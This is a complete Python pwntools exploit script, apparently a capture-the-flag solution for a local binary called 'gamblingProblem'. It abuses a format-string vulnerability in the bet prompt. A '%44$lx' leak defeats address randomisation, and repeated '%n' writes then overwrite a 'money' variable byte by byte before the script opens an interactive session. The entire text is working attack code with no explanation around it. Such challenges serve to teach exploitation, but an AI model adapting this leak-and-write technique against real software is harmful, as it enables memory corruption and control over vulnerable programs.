

from pwn import *

p = process('./gamblingProblem')

payload = "%44$lx"

p.sendlineafter("Choice :", '1')
p.sendlineafter("(1 = yes/0 = no):", '1')
p.sendlineafter('bet :', payload)


leak = int(p.recvline(), 16)
exec_base = leak - 0x1a70
money = exec_base + 0x402c
p.sendlineafter('(Number 1-100):', '1')


print(hex(money))
for i in range(3):
	payload = b"1%254lx%13$n".ljust(24, b'A') + p64(money+i)

	p.sendlineafter("(1 = yes/0 = no):", '1')
	p.sendlineafter('bet :', payload)
	p.sendlineafter('(Number 1-100):', '1')

payload = b"5%254lx%13$n".ljust(24, b'A') + p64(money+3)

p.sendlineafter("(1 = yes/0 = no):", '1')
p.sendlineafter('bet :', payload)
p.sendlineafter('(Number 1-100):', '1')



p.interactive()
p.close()